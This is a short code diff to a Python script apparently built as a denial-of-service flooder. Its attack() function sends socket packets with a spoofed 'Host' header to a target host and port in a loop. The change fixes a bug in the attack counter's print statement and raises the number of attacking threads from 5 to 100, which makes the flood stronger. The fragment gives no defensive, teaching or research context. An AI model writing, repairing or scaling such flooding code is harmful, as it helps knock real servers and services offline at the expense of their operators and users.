@@ -16,12 +16,12 @@ def attack():
 		s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
 		s.close()
 
-	global attack_num
-	attack_num += 1
-	if attack_num % 5 == 0:
-		print("Attacked with the " + attack_num + "threads.")
+		global attack_num
+		attack_num += 1
+		if attack_num % 100 == 0:
+			print("Attacked with " + str(attack_num) + " threads.")
 
-for i in range(5):
+for i in range(100):
 	thread = threading.Thread(target=attack)
 	thread.start()
 
